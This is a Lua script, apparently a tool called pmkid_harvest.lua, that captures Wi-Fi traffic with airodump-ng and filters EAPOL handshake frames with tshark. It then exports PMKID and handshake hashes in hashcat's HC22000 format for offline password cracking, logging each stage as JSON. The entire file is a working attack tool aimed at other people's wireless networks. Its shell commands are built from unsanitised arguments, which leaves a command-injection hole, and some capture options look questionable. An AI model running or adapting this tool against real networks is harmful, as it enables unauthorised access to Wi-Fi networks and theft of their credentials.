local iface = arg[1]
local output_prefix = arg[2] or "/tmp/pmkid_" .. iface
local timeout = tonumber(arg[3]) or 120

local function json_escape(s)
  return '"' .. tostring(s):gsub('\\', '\\\\'):gsub('"', '\\"'):gsub('\n', '\\n'):gsub('\r', '\\r') .. '"'
end

local function telemetry(event, data)
  local ts = tostring(os.time())
  io.write('{"event":' .. json_escape(event) .. ',"iface":' .. json_escape(iface) .. ',"bssid":"","ssid":"","channel":"","data":' .. data .. ',"timestamp":' .. json_escape(ts) .. '}\n')
  io.flush()
end

local function check_monitor_mode()
  local f = io.popen("iw dev " .. iface .. " info 2>/dev/null")
  if not f then return false end
  local out = f:read("*a")
  f:close()
  return out:find("type monitor") ~= nil
end

local function start_capture()
  local pcap = output_prefix .. ".pcap"
  local cmd = "airodump-ng --bssid ff:ff:ff:ff:ff:ff --channel 1-13 --write " .. output_prefix .. " --output-format pcap " .. iface .. " 2>/dev/null &"
  telemetry("capture_start", '{"cmd":' .. json_escape(cmd) .. ',"pcap":' .. json_escape(pcap) .. '}')
  os.execute(cmd)
  os.execute("sleep 2")
  return pcap
end

local function sniff_eapol()
  local pcap = output_prefix .. ".pcap"
  local start = os.time()
  local pmkid_found = false
  local eapol_count = 0
  while os.time() - start < timeout do
    os.execute("sleep 3")
    local f = io.popen("tshark -r " .. pcap .. " -Y 'eapol.keydes.key_info == 0x008a' -T fields -e frame.number -e wlan.sa -e wlan.da 2>/dev/null", "r")
    if f then
      for line in f:lines() do
        if line and #line > 5 then
          eapol_count = eapol_count + 1
          local num, sa, da = line:match("(%d+)%s+([%x:]+)%s+([%x:]+)")
          telemetry("eapol_m1", '{"frame":' .. json_escape(num or "") .. ',"source":' .. json_escape(sa or "") .. ',"dest":' .. json_escape(da or "") .. '}')
        end
      end
      f:close()
    end
    if eapol_count > 0 and not pmkid_found then
      local h = io.popen("hcxpcapngtool -o " .. output_prefix .. ".hc22000 " .. pcap .. " 2>/dev/null", "r")
      if h then
        local hout = h:read("*a")
        h:close()
        local hf = io.open(output_prefix .. ".hc22000", "r")
        if hf then
          local hc = hf:read("*a")
          hf:close()
          if hc and #hc > 0 then
            pmkid_found = true
            telemetry("pmkid_hash", '{"hash":' .. json_escape(hc:sub(1, 200)) .. ',"file":' .. json_escape(output_prefix .. ".hc22000") .. '}')
          end
        end
      end
    end
    telemetry("harvest_status", '{"eapol_count":' .. tostring(eapol_count) .. ',"pmkid_found":' .. tostring(pmkid_found) .. ',"elapsed":' .. tostring(os.time() - start) .. '}')
    if pmkid_found then break end
  end
  return pmkid_found
end

local function export_hc22000()
  local pcap = output_prefix .. ".pcap"
  local hc_file = output_prefix .. ".hc22000"
  local f = io.popen("hcxpcapngtool -o " .. hc_file .. " " .. pcap .. " 2>/dev/null", "r")
  if f then f:read("*a") f:close() end
  local hf = io.open(hc_file, "r")
  if hf then
    local content = hf:read("*a")
    hf:close()
    if content and #content > 0 then
      telemetry("export", '{"file":' .. json_escape(hc_file) .. ',"hashes":' .. tostring(#content) .. ',"format":"HC22000"}')
    else
      telemetry("export_empty", '{"file":' .. json_escape(hc_file) .. '}')
    end
  end
end

if not iface then
  telemetry("error", '{"error":"Usage: pmkid_harvest.lua <interface> [output_prefix] [timeout]"}')
  os.exit(1)
end

if not check_monitor_mode() then
  telemetry("error", '{"error":"Monitor mode required on ' .. iface .. '"}')
  os.exit(1)
end

local ok, err = pcall(function()
  start_capture()
  sniff_eapol()
  export_hc22000()
end)

if not ok then
  telemetry("error", '{"error":' .. json_escape(tostring(err)) .. '}')
  os.exit(1)
end

telemetry("complete", '{"output_prefix":' .. json_escape(output_prefix) .. ',"timeout":' .. tostring(timeout) .. '}')
